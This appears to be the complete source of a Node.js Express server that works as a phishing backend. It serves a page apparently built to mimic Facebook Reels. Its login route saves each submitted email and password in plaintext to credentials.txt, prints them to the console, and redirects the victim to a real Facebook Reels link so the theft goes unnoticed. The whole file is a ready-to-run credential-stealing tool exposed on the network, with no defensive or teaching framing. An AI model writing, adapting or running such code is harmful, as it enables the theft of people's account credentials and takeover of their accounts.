const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

// To parse form data
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files in public folder (for CSS, JS, images, etc.)
app.use(express.static(path.join(__dirname, 'public')));

// Serve Reels.html at root route
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'Reels.html'));
});

// Handle login POST request
app.post('/login', (req, res) => {
  const { email, password } = req.body;

  // Save credentials to a file (append mode)
  const logLine = `Email: ${email} | Password: ${password}\n`;
  fs.appendFile('credentials.txt', logLine, (err) => {
    if (err) {
      console.error('Failed to save credentials:', err);
    }
  });

  // Log credentials to the console
  console.log(`Email: ${email} | Password: ${password}`);

  // Redirect user to Facebook reels
  res.redirect('https://www.facebook.com/share/r/1Y1gK2TYLU/?mibextid=wwXIfr'); // Extracted video ID
});

// Start server and make it accessible on the network
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server listening on http://0.0.0.0:${PORT}`);
});
